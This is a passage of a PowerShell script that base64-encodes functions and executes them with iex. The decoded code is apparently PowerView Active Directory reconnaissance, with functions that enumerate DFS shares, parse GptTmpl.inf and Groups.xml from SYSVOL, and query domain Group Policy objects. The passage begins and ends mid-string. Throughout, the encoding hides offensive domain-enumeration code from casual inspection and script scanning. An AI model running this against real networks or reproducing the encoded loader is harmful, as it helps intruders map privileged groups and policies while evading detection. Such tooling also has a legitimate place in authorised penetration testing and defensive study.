iAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMSBlcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkREZTU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRwa3QgLWFuZCAkcGt0WzBdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcnNlLVBrdCAkcGt0WzBdIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfIC1uZSAnbnVsbCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgQHsnTmFtZSc9JFByb3BlcnRpZXMubmFtZVswXTsnUmVtb3RlU2VydmVyTmFtZSc9JF99CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjEgZXJyb3IgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRERlNzaGFyZXMgfCBTb3J0LU9iamVjdCAtVW5pcXVlIC1Qcm9wZXJ0eSAnUmVtb3RlU2VydmVyTmFtZScKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBHZXQtRG9tYWluREZTU2hhcmVWMiB7CiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgICAgIFBhcmFtKAogICAgICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgICAgICREb21haW4sCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJFNlcnZlciwKICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgICAgICAgICBbSW50XQogICAgICAgICAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgICAgICAgICAgW0ludF0KICAgICAgICAgICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgICAgICAgICBbU3dpdGNoXQogICAgICAgICAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICAgICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgICAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICAgICAgICAgKQogICAgICAgICAgICAkREZTc2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFBTQm91bmRQYXJhbWV0ZXJzCiAgICAgICAgICAgIGlmICgkREZTc2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICRERlNzaGFyZXMgPSBAKCkKICAgICAgICAgICAgICAgICRERlNzZWFyY2hlci5maWx0ZXIgPSAnKCYob2JqZWN0Q2xhc3M9bXNERlMtTGlua3YyKSknCiAgICAgICAgICAgICAgICAkTnVsbCA9ICRERlNTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZFJhbmdlKCgnbXNkZnMtbGlua3BhdGh2MicsJ21zREZTLVRhcmdldExpc3R2MicpKQogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0cyA9ICRERlNTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvcGVydGllcyA9ICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9saXN0ID0gJFByb3BlcnRpZXMuJ21zZGZzLXRhcmdldGxpc3R2MidbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJHhtbCA9IFt4bWxdW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJHRhcmdldF9saXN0WzIuLigkdGFyZ2V0X2xpc3QuTGVuZ3RoLTEpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJERGU3NoYXJlcyArPSAkeG1sLnRhcmdldHMuQ2hpbGROb2RlcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldCA9ICRfLklubmVyVGV4dAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICggJFRhcmdldC5Db250YWlucygnXCcpICkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkREZTcm9vdCA9ICRUYXJnZXQuc3BsaXQoJ1wnKVszXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2hhcmVOYW1lID0gJFByb3BlcnRpZXMuJ21zZGZzLWxpbmtwYXRodjInWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeydOYW1lJz0iJERGU3Jvb3QkU2hhcmVOYW1lIjsnUmVtb3RlU2VydmVyTmFtZSc9JFRhcmdldC5zcGxpdCgnXCcpWzJdfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMiBlcnJvciBpbiBwYXJzaW5nIHRhcmdldCA6ICRfIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkREZTU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjIgZXJyb3IgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRERlNzaGFyZXMgfCBTb3J0LU9iamVjdCAtVW5pcXVlIC1Qcm9wZXJ0eSAnUmVtb3RlU2VydmVyTmFtZScKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgICRERlNzaGFyZXMgPSBAKCkKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0RG9tYWluIGluICREb21haW4pIHsKICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVGFyZ2V0RG9tYWluCiAgICAgICAgICAgICAgICBpZiAoJFZlcnNpb24gLW1hdGNoICdhbGx8MScpIHsKICAgICAgICAgICAgICAgICAgICAkREZTc2hhcmVzICs9IEdldC1Eb21haW5ERlNTaGFyZVYxIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRWZXJzaW9uIC1tYXRjaCAnYWxsfDInKSB7CiAgICAgICAgICAgICAgICAgICAgJERGU3NoYXJlcyArPSBHZXQtRG9tYWluREZTU2hhcmVWMiBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaWYgKCRWZXJzaW9uIC1tYXRjaCAnYWxsfDEnKSB7CiAgICAgICAgICAgICAgICAkREZTc2hhcmVzICs9IEdldC1Eb21haW5ERlNTaGFyZVYxIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkVmVyc2lvbiAtbWF0Y2ggJ2FsbHwyJykgewogICAgICAgICAgICAgICAgJERGU3NoYXJlcyArPSBHZXQtRG9tYWluREZTU2hhcmVWMiBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkREZTc2hhcmVzIHwgU29ydC1PYmplY3QgLVByb3BlcnR5ICgnUmVtb3RlU2VydmVyTmFtZScsJ05hbWUnKSAtVW5pcXVlCiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUdwdFRtcGwgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtIYXNodGFibGVdKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ2dwY2ZpbGVzeXNwYXRoJywgJ1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcHRUbXBsUGF0aCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRPdXRwdXRPYmplY3QsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJE1hcHBlZFBhdGhzID0gQHt9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoKCRHcHRUbXBsUGF0aCAtTWF0Y2ggJ1xcXFwuKlxcLionKSAtYW5kICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkpIHsKICAgICAgICAgICAgICAgICRTeXNWb2xQYXRoID0gIlxcJCgoTmV3LU9iamVjdCBTeXN0ZW0uVXJpKCRHcHRUbXBsUGF0aCkpLkhvc3QpXFNZU1ZPTCIKICAgICAgICAgICAgICAgIGlmICgtbm90ICRNYXBwZWRQYXRoc1skU3lzVm9sUGF0aF0pIHsKICAgICAgICAgICAgICAgICAgICBBZGQtUmVtb3RlQ29ubmVjdGlvbiAtUGF0aCAkU3lzVm9sUGF0aCAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICRNYXBwZWRQYXRoc1skU3lzVm9sUGF0aF0gPSAkVHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRUYXJnZXRHcHRUbXBsUGF0aCA9ICRHcHRUbXBsUGF0aAogICAgICAgICAgICBpZiAoLW5vdCAkVGFyZ2V0R3B0VG1wbFBhdGguRW5kc1dpdGgoJy5pbmYnKSkgewogICAgICAgICAgICAgICAgJFRhcmdldEdwdFRtcGxQYXRoICs9ICdcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBOVFxTZWNFZGl0XEdwdFRtcGwuaW5mJwogICAgICAgICAgICB9CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtR3B0VG1wbF0gUGFyc2luZyBHcHRUbXBsUGF0aDogJFRhcmdldEdwdFRtcGxQYXRoIgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydPdXRwdXRPYmplY3QnXSkgewogICAgICAgICAgICAgICAgJENvbnRlbnRzID0gR2V0LUluaUNvbnRlbnQgLVBhdGggJFRhcmdldEdwdFRtcGxQYXRoIC1PdXRwdXRPYmplY3QgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgICAgIGlmICgkQ29udGVudHMpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udGVudHMgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUGF0aCcgJFRhcmdldEdwdFRtcGxQYXRoCiAgICAgICAgICAgICAgICAgICAgJENvbnRlbnRzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkQ29udGVudHMgPSBHZXQtSW5pQ29udGVudCAtUGF0aCAkVGFyZ2V0R3B0VG1wbFBhdGggLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgICAgIGlmICgkQ29udGVudHMpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udGVudHNbJ1BhdGgnXSA9ICRUYXJnZXRHcHRUbXBsUGF0aAogICAgICAgICAgICAgICAgICAgICRDb250ZW50cwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1HcHRUbXBsXSBFcnJvciBwYXJzaW5nICRUYXJnZXRHcHRUbXBsUGF0aCA6ICRfIgogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgJE1hcHBlZFBhdGhzLktleXMgfCBGb3JFYWNoLU9iamVjdCB7IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICRfIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUdyb3Vwc1hNTCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Hcm91cHNYTUwnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cHNYTUxQYXRoLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRNYXBwZWRQYXRocyA9IEB7fQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCgkR3JvdXBzWE1MUGF0aCAtTWF0Y2ggJ1xcXFwuKlxcLionKSAtYW5kICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkpIHsKICAgICAgICAgICAgICAgICRTeXNWb2xQYXRoID0gIlxcJCgoTmV3LU9iamVjdCBTeXN0ZW0uVXJpKCRHcm91cHNYTUxQYXRoKSkuSG9zdClcU1lTVk9MIgogICAgICAgICAgICAgICAgaWYgKC1ub3QgJE1hcHBlZFBhdGhzWyRTeXNWb2xQYXRoXSkgewogICAgICAgICAgICAgICAgICAgIEFkZC1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICRTeXNWb2xQYXRoIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgICAgICAgICAgJE1hcHBlZFBhdGhzWyRTeXNWb2xQYXRoXSA9ICRUcnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgW1hNTF0kR3JvdXBzWE1MY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRHcm91cHNYTUxQYXRoIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgICAgICRHcm91cHNYTUxjb250ZW50IHwgU2VsZWN0LVhtbCAiL0dyb3Vwcy9Hcm91cCIgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBub2RlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEdyb3VwbmFtZSA9ICRfLlByb3BlcnRpZXMuZ3JvdXBOYW1lCiAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAkXy5Qcm9wZXJ0aWVzLmdyb3VwU2lkCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkR3JvdXBTSUQpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJEdyb3VwbmFtZSAtbWF0Y2ggJ0FkbWluaXN0cmF0b3JzJykgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAnUy0xLTUtMzItNTQ0JwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRHcm91cG5hbWUgLW1hdGNoICdSZW1vdGUgRGVza3RvcCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwU0lEID0gJ1MtMS01LTMyLTU1NScKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkR3JvdXBuYW1lIC1tYXRjaCAnR3Vlc3RzJykgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSAnUy0xLTUtMzItNTQ2JwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTSUQgPSBDb252ZXJ0VG8tU0lEIC1PYmplY3ROYW1lICRHcm91cG5hbWUgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNJRCA9IENvbnZlcnRUby1TSUQgLU9iamVjdE5hbWUgJEdyb3VwbmFtZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE1lbWJlcnMgPSAkXy5Qcm9wZXJ0aWVzLm1lbWJlcnMgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBNZW1iZXIgfCBXaGVyZS1PYmplY3QgeyAkXy5hY3Rpb24gLW1hdGNoICdBREQnIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRfLnNpZCkgeyAkXy5zaWQgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgeyAkXy5uYW1lIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkTWVtYmVycykgewogICAgICAgICAgICAgICAgICAgIGlmICgkXy5maWx0ZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRGaWx0ZXJzID0gJF8uZmlsdGVycy5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgQHsnVHlwZScgPSAkXy5Mb2NhbE5hbWU7J1ZhbHVlJyA9ICRfLm5hbWV9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRGaWx0ZXJzID0gJE51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXJzIC1pc25vdCBbU3lzdGVtLkFycmF5XSkgeyAkTWVtYmVycyA9IEAoJE1lbWJlcnMpIH0KICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHcm91cHNYTUwgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPUGF0aCcgJFRhcmdldEdyb3Vwc1hNTFBhdGgKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0ZpbHRlcnMnICRGaWx0ZXJzCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE5hbWUnICRHcm91cE5hbWUKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwU0lEJyAkR3JvdXBTSUQKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTWVtYmVyT2YnICROdWxsCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cE1lbWJlcnMnICRNZW1iZXJzCiAgICAgICAgICAgICAgICAgICAgJEdyb3Vwc1hNTC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR3JvdXBzWE1MJykKICAgICAgICAgICAgICAgICAgICAkR3JvdXBzWE1MCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2ggewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUdyb3Vwc1hNTF0gRXJyb3IgcGFyc2luZyAkVGFyZ2V0R3JvdXBzWE1MUGF0aCA6ICRfIgogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgJE1hcHBlZFBhdGhzLktleXMgfCBGb3JFYWNoLU9iamVjdCB7IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uIC1QYXRoICRfIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdQTyB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuR1BPJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkdQTy5SYXcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ05vbmUnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0NvbXB1dGVySWRlbnRpdHknKV0KICAgICAgICBbQWxpYXMoJ0NvbXB1dGVyTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJJZGVudGl0eSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVXNlcklkZW50aXR5JyldCiAgICAgICAgW0FsaWFzKCdVc2VyTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlcklkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KIC